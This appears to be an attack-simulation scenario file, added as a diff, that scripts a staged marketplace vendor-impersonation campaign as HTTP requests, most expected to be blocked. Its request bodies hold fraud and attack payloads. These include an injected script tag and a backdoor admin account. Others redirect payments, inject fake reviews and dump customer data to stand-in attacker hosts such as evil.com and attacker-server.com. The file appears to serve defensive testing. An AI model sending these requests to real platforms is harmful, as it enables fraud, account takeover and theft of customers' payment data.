@@ -1,0 +1,325 @@
+{
+  "id": "marketplace-vendor-impersonation",
+  "name": "Marketplace Vendor Impersonation Campaign",
+  "category": "E-commerce Fraud",
+  "difficulty": "Expert",
+  "description": "Advanced marketplace exploitation targeting seller account takeover, product listing manipulation, review system gaming, rating inflation, and payment redirection attacks",
+  "tags": [
+    "vendor-impersonation",
+    "listing-manipulation",
+    "review-fraud",
+    "rating-inflation",
+    "payment-redirect"
+  ],
+  "steps": [
+    {
+      "id": "vendor-recon-1",
+      "name": "Vendor Registration Endpoint Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/vendors/registration-info",
+        "headers": {
+          "Accept": "application/json"
+        }
+      },
+      "execution": {
+        "delayMs": 300
+      }
+    },
+    {
+      "id": "vendor-recon-2",
+      "name": "Vendor Profile Structure Analysis",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/vendors/profile-template",
+        "headers": {
+          "Accept": "application/json",
+          "User-Agent": "Mozilla/5.0 (compatible; VendorBot/1.0)"
+        }
+      },
+      "execution": {
+        "delayMs": 400
+      },
+      "dependsOn": [
+        "vendor-recon-1"
+      ]
+    },
+    {
+      "id": "vendor-weaponize-1",
+      "name": "Fraudulent Vendor Account Creation",
+      "stage": "weaponization",
+      "request": {
+        "method": "POST",
+        "url": "/api/vendors/register",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"business_name\": \"Premium Electronics Ltd\", \"email\": \"contact@premiumelect.com\", \"phone\": \"+1-555-0199\", \"tax_id\": \"12-3456789\", \"bank_account\": \"routing:021000021,account:1234567890\", \"identity_docs\": \"data:image/jpeg;base64,/9j/fake_docs\", \"bypass_verification\": \"urgent_launch\"}"
+      },
+      "execution": {
+        "delayMs": 800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-recon-2"
+      ]
+    },
+    {
+      "id": "vendor-weaponize-2",
+      "name": "Seller Account Takeover Attempt",
+      "stage": "weaponization",
+      "request": {
+        "method": "POST",
+        "url": "/api/vendors/password-reset",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "192.168.1.100"
+        },
+        "body": "{\"email\": \"top.seller@marketplace.com\", \"new_phone\": \"+1-555-0123\", \"security_question\": \"What was your first pet?\", \"answer\": \"fluffy\", \"backup_email\": \"recovery@tempmail.org\"}"
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-weaponize-1"
+      ]
+    },
+    {
+      "id": "vendor-deliver-1",
+      "name": "Product Listing Manipulation",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/products/listings",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer compromised_vendor_token"
+        },
+        "body": "{\"title\": \"iPhone 15 Pro Max - Brand New Sealed\", \"description\": \"Authentic Apple iPhone 15 Pro Max. Ships from authorized distributor. <script>steal_payment_info()</script>\", \"price\": 299.99, \"original_price\": 1199.99, \"category\": \"electronics\", \"images\": [\"https://evil.com/harvest.jpg\"], \"inventory\": 999, \"fake_reviews_count\": 2847, \"rating_override\": 4.9}"
+      },
+      "execution": {
+        "delayMs": 1200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-weaponize-2"
+      ]
+    },
+    {
+      "id": "vendor-deliver-2",
+      "name": "Bulk Review Injection",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/reviews/submit",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Bulk-Operation": "true"
+        },
+        "body": "{\"product_id\": \"PROD12345\", \"reviews\": [{\"rating\": 5, \"text\": \"Amazing quality! Fast shipping!\", \"verified_purchase\": true, \"user_id\": \"fake_user_1\"}, {\"rating\": 5, \"text\": \"Best deal ever! Highly recommended!\", \"verified_purchase\": true, \"user_id\": \"fake_user_2\"}, {\"rating\": 5, \"text\": \"Perfect condition, authentic product!\", \"verified_purchase\": true, \"user_id\": \"fake_user_3\"}], \"bypass_rate_limit\": true}"
+      },
+      "execution": {
+        "delayMs": 1500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-deliver-1"
+      ]
+    },
+    {
+      "id": "vendor-exploit-1",
+      "name": "Rating System Manipulation",
+      "stage": "exploitation",
+      "request": {
+        "method": "PUT",
+        "url": "/api/ratings/bulk",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer admin_impersonation_token"
+        },
+        "body": "{\"vendor_id\": \"VEND789\", \"rating_adjustments\": [{\"product_id\": \"PROD12345\", \"new_rating\": 4.95, \"review_count\": 3847}, {\"product_id\": \"PROD12346\", \"new_rating\": 4.89, \"review_count\": 2156}], \"suppress_negative_reviews\": true, \"boost_positive_weight\": 3.5}"
+      },
+      "execution": {
+        "delayMs": 1800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-deliver-2"
+      ]
+    },
+    {
+      "id": "vendor-exploit-2",
+      "name": "Payment Method Redirection",
+      "stage": "exploitation",
+      "request": {
+        "method": "PUT",
+        "url": "/api/payments/redirect",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Admin-Override": "maintenance_mode"
+        },
+        "body": "{\"vendor_id\": \"VEND789\", \"redirect_payments\": true, \"new_payment_endpoint\": \"https://evil-payment-processor.com/collect\", \"maintain_receipts\": true, \"notification_webhook\": \"https://attacker.com/webhook\", \"temporary_redirect\": \"system_upgrade\"}"
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-exploit-1"
+      ]
+    },
+    {
+      "id": "vendor-exploit-3",
+      "name": "Inventory Manipulation Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/products/inventory/bulk-update",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"updates\": [{\"product_id\": \"COMPETITOR_PROD_1\", \"inventory\": 0, \"status\": \"discontinued\"}, {\"product_id\": \"COMPETITOR_PROD_2\", \"inventory\": 0, \"status\": \"recalled\"}], \"reason\": \"inventory_audit\", \"competitor_sabotage\": true}"
+      },
+      "execution": {
+        "delayMs": 2200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-exploit-2"
+      ]
+    },
+    {
+      "id": "vendor-privilege-1",
+      "name": "Vendor Admin Privilege Escalation",
+      "stage": "privilege-escalation",
+      "request": {
+        "method": "PUT",
+        "url": "/api/vendors/profile",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Privilege-Override": "emergency_access"
+        },
+        "body": "{\"vendor_id\": \"VEND789\", \"account_type\": \"premium_partner\", \"permissions\": [\"admin_dashboard\", \"bulk_operations\", \"fee_exemption\", \"priority_support\"], \"commission_rate\": 0.01, \"verification_status\": \"verified_plus\", \"admin_notes\": \"VIP_treatment\"}"
+      },
+      "execution": {
+        "delayMs": 2500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-exploit-3"
+      ]
+    },
+    {
+      "id": "vendor-persist-1",
+      "name": "Vendor Dashboard Backdoor Creation",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/vendors/admin/create-backdoor",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer escalated_vendor_token"
+        },
+        "body": "{\"backdoor_user\": \"system_maintenance\", \"email\": \"maint@internal-vendor-tools.com\", \"password\": \"VendorAccess2024!\", \"permissions\": [\"*\"], \"hidden_account\": true, \"expires\": \"2025-12-31\", \"audit_log_bypass\": true}"
+      },
+      "execution": {
+        "delayMs": 2800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-privilege-1"
+      ]
+    },
+    {
+      "id": "vendor-exfil-1",
+      "name": "Customer Payment Data Harvesting",
+      "stage": "exfiltration",
+      "request": {
+        "method": "GET",
+        "url": "/api/vendors/customer-transactions",
+        "headers": {
+          "Accept": "application/json",
+          "X-Export-Format": "full_details",
+          "Authorization": "Bearer backdoor_token"
+        }
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-persist-1"
+      ]
+    },
+    {
+      "id": "vendor-exfil-2",
+      "name": "Competitor Intelligence Gathering",
+      "stage": "exfiltration",
+      "request": {
+        "method": "GET",
+        "url": "/api/vendors/analytics/competitor-data",
+        "headers": {
+          "Accept": "application/json",
+          "X-Include-Sensitive": "true",
+          "X-Data-Range": "all_time"
+        },
+        "body": "{\"include_pricing\": true, \"include_inventory\": true, \"include_customer_overlap\": true, \"include_revenue_data\": true, \"export_format\": \"detailed_csv\"}"
+      },
+      "execution": {
+        "delayMs": 3200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-exfil-1"
+      ]
+    },
+    {
+      "id": "vendor-exfil-3",
+      "name": "Marketplace Database Dump",
+      "stage": "exfiltration",
+      "request": {
+        "method": "POST",
+        "url": "/api/vendors/export/database",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Export-Authorization": "emergency_backup"
+        },
+        "body": "{\"tables\": [\"vendors\", \"products\", \"customers\", \"transactions\", \"reviews\", \"ratings\"], \"include_pii\": true, \"include_financial\": true, \"compression\": \"gzip\", \"delivery_method\": \"ftp://attacker-server.com/dumps/\"}"
+      },
+      "execution": {
+        "delayMs": 3500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "vendor-exfil-2"
+      ]
+    }
+  ]
+}
